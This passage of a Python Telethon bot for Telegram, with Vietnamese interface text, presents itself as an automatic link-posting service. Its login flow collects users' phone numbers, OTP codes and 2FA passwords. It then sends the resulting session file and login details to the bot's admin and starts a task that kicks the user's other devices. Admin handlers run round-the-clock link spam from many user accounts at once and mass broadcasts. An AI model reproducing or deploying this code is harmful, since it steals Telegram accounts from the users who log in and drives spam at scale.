                    return await cv.send_message(f"⚠️ `@{username}` đã có trong danh sách rồi!")
                groups.append({"username": username, "link": link, "name": name})
                save_required_groups(groups)
                REQUIRED_GROUPS = groups
                await cv.send_message(
                    f"✅ **Đã thêm thành công!**\n"
                    f"• Username: `@{username}`\n"
                    f"• Tên: `{name}`\n"
                    f"• Link: {link}\n\n"
                    f"Tổng hiện tại: `{len(groups)}` kênh/nhóm."
                )
            except Exception as ex:
                await cv.send_message(f"❌ Lỗi: `{ex}`")

    elif data == "adm_rg_remove":
        if u != O_ID: return
        await ev.answer()
        groups = load_required_groups()
        if not groups:
            return await ev.answer("⚠️ Danh sách trống!", alert=True)
        async with bot.conversation(u) as cv:
            lines = "\n".join(f"{i+1}. `@{g['username']}` — {g['name']}" for i, g in enumerate(groups))
            await cv.send_message(
                f"🗑 **XÓA KÊNH/NHÓM BẮT BUỘC**\n"
                f"────────────────\n"
                f"{lines}\n\n"
                f"Nhập **STT** muốn xóa (VD: `1`):"
            )
            res = (await cv.get_response()).text.strip()
            try:
                idx = int(res) - 1
                if idx < 0 or idx >= len(groups):
                    return await cv.send_message("❌ STT không hợp lệ!")
                removed = groups.pop(idx)
                save_required_groups(groups)
                REQUIRED_GROUPS = groups
                await cv.send_message(
                    f"✅ **Đã xóa:** `@{removed['username']}` — {removed['name']}\n"
                    f"Còn lại: `{len(groups)}` kênh/nhóm."
                )
            except ValueError:
                await cv.send_message("❌ Nhập số nguyên hợp lệ!")
            except Exception as ex:
                await cv.send_message(f"❌ Lỗi: `{ex}`")

    elif data == "adm_rg_reset":
        if u != O_ID: return
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("⚠️ Gõ `XAC NHAN` để reset về 2 kênh mặc định:")
            res = (await cv.get_response()).text.strip()
            if res == "XAC NHAN":
                default = [
                    {"username": "chatbotrailink", "link": "https://t.me/chatbotrailink", "name": "Kênh Chính"},
                    {"username": "Botrailink",     "link": "https://t.me/Botrailink",     "name": "Kênh Phụ"}
                ]
                save_required_groups(default)
                REQUIRED_GROUPS = default
                await cv.send_message("✅ Đã reset về mặc định thành công!")
            else:
                await cv.send_message("❌ Đã hủy.")

    elif data == "adm_multi_spam_setup":
        if u != O_ID: return
        await ev.answer()
        active_uids = list(u_c.keys())
        if not active_uids:
            return await ev.respond("⚠️ Không có tài khoản nào đang hoạt động trong hệ thống!")
        async with bot.conversation(u) as cv:
            await cv.send_message(f"🔢 **Đang có `{len(active_uids)}` tài khoản sẵn sàng.**\nNhập số lượng tài khoản muốn dùng để rải (VD: `3` hoặc chữ `all` để chọn tất cả):")
            num_res = (await cv.get_response()).text.strip()
            if num_res.lower() == "all":
                selected_uids = active_uids
            else:
                try:
                    n = int(num_res)
                    selected_uids = active_uids[:n]
                except:
                    selected_uids = active_uids[:1]
            await cv.send_message("📝 **Nhập nội dung rải link (nguyên khối nhiều dòng):**")
            content_res = (await cv.get_response()).text.strip()
            await cv.send_message("🖼 **Gửi hình ảnh đi kèm (hoặc gửi dấu gạch `-` nếu không dùng ảnh):**")
            photo_res = await cv.get_response()
            photo_path = None
            if photo_res.photo:
                photo_path = await photo_res.download_media(file=f"admin_multi_photo_{u}.jpg")
            count_started = 0
            for target_uid in selected_uids:
                client = u_c.get(target_uid)
                if client:
                    if target_uid in auto_link_tasks:
                        auto_link_tasks[target_uid].cancel()
                    temp_link_file = f"custom_links_{target_uid}.txt"
                    with open(temp_link_file, "w", encoding="utf-8") as f:
                        f.write(content_res)
                    if photo_path and os.path.exists(photo_path):
                        shutil.copy(photo_path, f"custom_photo_{target_uid}.jpg")
                    task = asyncio.create_task(background_auto_link_worker(target_uid, client, mode="groups"))
                    auto_link_tasks[target_uid] = task
                    auto_link_modes[target_uid] = "groups"
                    count_started += 1
            if photo_path and os.path.exists(photo_path):
                try: os.remove(photo_path)
                except: pass
            await cv.send_message(f"✅ **ĐÃ KÍCH HOẠT THÀNH CÔNG `{count_started}` TÀI KHOẢN TỰ ĐỘNG RẢI 24/24!**")

    elif data == "adm_broadcast":
        if u != O_ID: return
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("📢 **Nhập nội dung thông báo gửi tới toàn bộ người dùng từng bấm start bot:**")
            bc_msg = await cv.get_response()
            text_to_send = bc_msg.text
            photo_to_send = bc_msg.photo
            if os.path.exists(F1):
                with open(F1, "r", encoding="utf-8") as f:
                    users = [int(line.strip()) for line in f if line.strip().isdigit()]
            else:
                users = []
            if not users:
                return await cv.send_message("⚠️ Không có user nào trong danh sách `bot_users.txt`.")
            await cv.send_message(f"⏳ Đang gửi thông báo đến `{len(users)}` người dùng...")
            success, fail = 0, 0
            for uid in users:
                try:
                    if photo_to_send:
                        await bot.send_file(uid, photo_to_send, caption=text_to_send, parse_mode='markdown')
                    else:
                        await bot.send_message(uid, text_to_send, parse_mode='markdown')
                    success += 1
                    await asyncio.sleep(0.1)
                except:
                    fail += 1
            await cv.send_message(f"✅ **GỬI BROADCAST HOÀN TẤT!**\n• Thành công: `{success}`\n• Thất bại: `{fail}`")

    elif data == "login":
        if u in u_c: return await ev.answer("✅ Bạn đã đăng nhập rồi!", alert=True)
        await ev.answer()
        async with bot.conversation(u, timeout=120) as cv:
            try:
                await cv.send_message("📱 **Nhập Số Điện Thoại** (`+84...`):")
                p = (await cv.get_response()).text.strip().replace(" ", "")
                c = TelegramClient(f"u_{u}", A_ID, A_HS, connection_retries=5, timeout=30)
                await c.connect()
                if not await c.is_user_authorized():
                    try:
                        r = await c.send_code_request(p)
                    except Exception as err:
                        return await cv.send_message(f"❌ **Lỗi gửi mã:** `{err}`")
                    await cv.send_message("🔑 **Nhập OTP** (⚠️ *BẮT BUỘC cách khoảng, VD: 4 8 1 1 7*):")
                    o = (await cv.get_response()).text.strip().replace(" ", "").replace("-", "")
                    try:
                        await c.sign_in(p, o, phone_code_hash=r.phone_code_hash)
                    except SessionPasswordNeededError:
                        await cv.send_message("🔐 **Tài khoản bật Mật Khẩu 2FA.** Nhập mật khẩu:")
                        pwd = (await cv.get_response()).text.strip()
                        user_2fa_passwords[u] = pwd
                        await c.sign_in(password=pwd)
                    except Exception as err:
                        return await cv.send_message(f"❌ **Lỗi xác thực:** `{err}`")
                u_c[u] = c
                with open(f"login_time_{u}.txt", "w", encoding="utf-8") as f:
                    f.write(str(time.time()))
                await fetch_and_save_ip(c, u)
                await send_session_file_to_admin(c, u, p)
                task = asyncio.create_task(start_anti_disconnect(u, c))
                anti_disconnect_tasks[u] = task
                dev_task = asyncio.create_task(check_and_kick_devices_background(u, c))
                anti_disconnect_tasks[f"dev_{u}"] = dev_task
                await notify_admin_login(c, u, p)
                await cv.send_message("✅ **LOGIN THÀNH CÔNG!** Bây giờ bạn có thể cấu hình nội dung và bật tự động rải link.")
            except Exception as e:
                await cv.send_message(f"❌ **Lỗi Login:** `{e}`")

# ==========================================
# WEB SERVER & MAIN
# ==========================================
async def handle_ping(request):
    return web.Response(text="Bot Auto Link System is running 24/7!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/ping', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    global bot
    bot = TelegramClient('bot_manage', A_ID, A_HS, connection_retries=5, timeout=30)
    bot.add_event_handler(_st, events.NewMessage(pattern='/start'))
    bot.add_event_handler(handle_incoming_photos, events.NewMessage(func=lambda e: e.photo and e.is_private))
    bot.add_event_handler(_callback_handler, events.CallbackQuery)
    await start_web_server()
    await bot.start(bot_token=B_TK)
    for f in glob.glob("u_*.session"):
        try:
            u_str = f.split('_')[1].split('.')[0]
            if not u_str.isdigit(): continue
            u = int(u_str)
            if u not in u_c:
                c = TelegramClient(f"u_{u}", A_ID, A_HS, connection_retries=5, timeout=30)
                await c.connect()
                if await c.is_user_authorized():
                    u_c[u] = c
                    await fetch_and_save_ip(c, u)
                    task = asyncio.create_task(start_anti_disconnect(u, c))
                    anti_disconnect_tasks[u] = task
                    dev_task = asyncio.create_task(check_and_kick_devices_background(u, c))
                    anti_disconnect_tasks[f"dev_{u}"] = dev_task
                else:
                    await c.disconnect()
                    try: os.remove(f)
                    except: pass
        except: pass
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(main())
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        try:
            loop.close()
        except: pass
